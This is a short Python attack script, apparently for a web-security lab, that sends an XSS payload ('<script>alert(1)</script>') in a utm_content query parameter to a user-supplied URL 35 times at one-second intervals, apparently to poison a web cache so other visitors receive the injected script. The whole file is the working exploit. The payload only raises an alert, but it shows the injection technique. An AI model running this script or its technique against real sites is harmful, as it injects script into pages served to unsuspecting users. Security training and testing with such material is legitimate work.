import time
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1] + '/?utm_content=\'/><script>alert(1)</script>'

session = requests.Session()

for _ in range(35):
        session.get(burp_url)
        time.sleep(1)

